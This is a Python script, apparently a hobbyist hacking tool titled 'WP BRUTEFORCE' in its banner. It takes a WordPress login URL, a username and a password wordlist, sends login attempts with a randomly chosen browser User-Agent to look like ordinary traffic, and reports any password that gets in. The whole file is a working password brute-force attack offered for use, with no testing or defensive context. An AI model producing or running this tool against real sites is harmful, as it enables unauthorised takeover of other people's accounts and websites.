import requests    
import os    
import time    
import random  # added for random User-Agent    
    
# Terminal color    
YELLOW = "\033[33m"    
GREEN = "\033[32m"    
RED = "\033[31m"    
RESET = "\033[0m"    
    
#ASCII art Header    
print(YELLOW +"░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░          ░▒▓███████▓▒░░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓████████▓▒░" + RESET)    
print(YELLOW +"░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░         ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░" + RESET)    
print(YELLOW +"░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░         ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░" + RESET)    
print(YELLOW +"░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░          ░▒▓███████▓▒░░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░      ░▒▓██████▓▒░" + RESET)    
print(YELLOW +"░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░                ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░" + RESET)    
print(YELLOW +"░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░                ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░" + RESET)    
print(YELLOW +" ░▒▓█████████████▓▒░░▒▓█▓▒░                ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░   ░▒▓█▓▒░   ░▒▓████████▓▒░▒▓█▓▒░      ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓████████▓▒░" + RESET)    
    
# -------------------------------    
# 1. Dynamic target input    
url = input("Enter target WP login URL: ").strip()    
username = input("Enter username: ").strip()        
wordlist = input("Enter wordlist file path: ").strip()    
    
# Check if wordlist exists    
if not os.path.isfile(wordlist):    
    print(f"[!] Wordlist '{wordlist}' not found!")    
    exit()    
    
# 2. Headers setup with random User-Agent    
user_agents = [  
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",  
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",  
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:118.0) Gecko/20100101 Firefox/118.0"  
]  
headers = {    
    "User-Agent": random.choice(user_agents),    
    "Referer": url    
}    
    
# 3. Create session with error handling    
session = requests.Session()    
try:    
    session.get(url, headers=headers, timeout=10)    
except requests.exceptions.RequestException as e:    
    print(f"[!] Failed to connect to {url}: {e}")    
    exit()    
    
print(f"[+] Start bruteforce to {url} with username: {username}")    
    
# 4. Open wordlist and try passwords    
with open(wordlist, "r") as file:    
    for password in file:    
        password = password.strip()    
        data = {    
            "log": username,    
            "pwd": password,    
            "wp-submit": "Log In",    
            "redirect_to": "https://target.com/wp-admin/",    
            "testcookie": "1"    
        }    
    
        # POST request with retry    
        for attempt in range(3):    
            try:    
                response = session.post(url, data=data, headers=headers, timeout=10, allow_redirects=True)    
                break    
            except requests.exceptions.RequestException as e:    
                print(f"[!] Connection error, attempt {attempt+1}: {e}")    
                time.sleep(2)    
        else:    
            print(f"[!] Skipping password '{password}' due to repeated connection failures")    
            continue    
    
        # Check login success    
        if "wp-login.php" not in response.url:    
            print(f"{GREEN}[✓] Password found: {password}{RESET}")    
            break    
        else:    
            print(f"{RED}[-] Wrong: {password}{RESET}")    
    
print("[+] Bruteforce finished.")
